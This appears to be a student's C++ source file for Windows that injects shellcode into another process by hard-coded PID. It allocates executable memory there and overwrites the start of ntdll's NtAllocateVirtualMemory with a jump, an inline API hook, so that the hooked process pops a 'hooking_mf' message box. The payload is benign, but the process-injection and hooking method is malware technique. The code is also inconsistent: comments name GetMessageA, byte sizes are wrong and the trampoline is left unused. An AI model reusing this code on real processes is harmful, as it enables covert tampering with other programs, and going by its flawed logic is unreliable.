// Inline_hook.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <winternl.h>
using NtAllocateVirtualMemory = NTSTATUS(WINAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);

int main()
{
    DWORD ProcID = 14992;
    PROCESS_BASIC_INFORMATION Basic_info = { 0 };
    DWORD dwReturnLength = 0;
    CHAR buffer[256];
    DWORD jmp_back;
    unsigned char shellcode[] = {
     0x6a, 0x00,
     0x68, 0x00, 0x00, 0x00, 0x00,
     0x68, 0x00, 0x00, 0x00, 0x00,
     0x6A, 0x00,
     0XE8, 0x00, 0x00, 0x00, 0x00,
     0xE9, 0x01, 0x00, 0x00, 0x00,
     0xCC
    };

    unsigned char Tranpoline[] = {
        0x00, 0x00, 0x00, 0x00, 0x00,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };

    const char* mess_cap = "hooking_mf";
    const char* mess_title = "warning!";

    //get hooked Process handle 
    HANDLE Remote_Proc_Handle = OpenProcess(PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ, TRUE, ProcID);

    NtQueryInformationProcess(Remote_Proc_Handle, ProcessBasicInformation, &Basic_info, sizeof(Basic_info), &dwReturnLength);

    //alocate memory in hooked process for write shellcode and Tranpoline
    LPVOID Shellcode_mem_location = VirtualAllocEx(Remote_Proc_Handle, 0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //Cacualte adress of each in hooked process
    DWORD mess_cap_adress = (DWORD)Shellcode_mem_location;
    DWORD mess_title_adress = mess_cap_adress + strlen(mess_cap) + 1;
    DWORD shell_codes_adress = mess_title_adress + strlen(mess_title) + 1;
    DWORD Tranpoline_adress = shell_codes_adress + sizeof(shellcode);

    //Write mess cap and title into hooked process
    WriteProcessMemory(Remote_Proc_Handle, LPVOID(mess_cap_adress), mess_cap, strlen(mess_cap), 0);
    WriteProcessMemory(Remote_Proc_Handle, LPVOID(mess_title_adress), mess_title, strlen(mess_title), 0);

    //Iden the adress of 2 API GetMessageA (which we will overwrite for hooking) and MessageBoxA (Using for shellcode)
    HMODULE hUser32 = LoadLibrary(TEXT("user32.dll"));
    HMODULE hNtdll = LoadLibrary(TEXT("ntdll.dll"));
    HMODULE hKernel32 = LoadLibrary(TEXT("kernel32.dll"));

    HMODULE test = LoadLibraryA(("C:\\Windows\\System32\\ntdll.dll"));

    //DWORD Hooked_API_Adress = (DWORD)GetProcAddress(hUser32, "PostQuitMessage");
        //DWORD Hooked_API_Adress = (DWORD)GetProcAddress(hUser32, "PostQuitMessage");
    DWORD Hooked_API_Adress = (DWORD)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    ULONG_PTR test2 = (ULONG_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");


    DWORD Message_Box_API_Adress = (DWORD)GetProcAddress(hUser32, "MessageBoxA");


    if (Hooked_API_Adress == NULL || Message_Box_API_Adress == NULL)
    {
        printf("Get API adress faild");
        return 1;
    }
   

    DWORD lpflOldProtect = 0;
    DWORD bSuccess = VirtualProtectEx(Remote_Proc_Handle,(LPVOID)(Hooked_API_Adress), sizeof(DWORD), PAGE_READWRITE, &lpflOldProtect);
    if (!bSuccess) {
        std::cerr << "Failed to change protect. Error: " << GetLastError() << std::endl;
        return 1;
    }

    //Copy first 5 bits of hocked code to our Tranpoline and write adress to return to API code (push the adress to ebx and ret back to api code origin)
    ReadProcessMemory(Remote_Proc_Handle, (LPVOID)Hooked_API_Adress, &Tranpoline, 0x5, 0);
    DWORD Adress_to_go_back = Hooked_API_Adress + 5;
    memcpy_s(Tranpoline + 6, sizeof(DWORD), &Adress_to_go_back, sizeof(DWORD));

    //Overwrite first 5 bits of hocked code (GetMessageA) into our code (jmp to adress of our shellcode)
    jmp_back = shell_codes_adress - (Hooked_API_Adress + 5);
    BYTE jmp = 0XE9;
    DWORD Write_Jmp = WriteProcessMemory(Remote_Proc_Handle, LPVOID(Hooked_API_Adress), &jmp, sizeof(DWORD), 0);
    DWORD Write_Jmp_Adress = WriteProcessMemory(Remote_Proc_Handle, LPVOID(Hooked_API_Adress+1), &jmp_back, sizeof(DWORD), 0); 
    if (Write_Jmp== NULL || Write_Jmp_Adress == NULL)
    {
        printf("Write_Jmp or Write_Jmp_Adress fail");
    }

    //Write Tranpoline into hooked process memory
    WriteProcessMemory(Remote_Proc_Handle, LPVOID(Tranpoline_adress), Tranpoline,sizeof(Tranpoline), 0);

    //write shellcode to hooked process
    DWORD Realative_Adress_to_API = Message_Box_API_Adress - (shell_codes_adress + 19);
    memcpy_s(shellcode + 3, sizeof(DWORD), &mess_cap_adress, sizeof(DWORD));
    memcpy_s(shellcode + 8, sizeof(DWORD), &mess_title_adress, sizeof(DWORD));
    memcpy_s(shellcode + 15, sizeof(DWORD), &Realative_Adress_to_API, sizeof(DWORD));
    WriteProcessMemory(Remote_Proc_Handle, LPVOID(shell_codes_adress), shellcode, sizeof(shellcode), 0);

    printf("s");
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
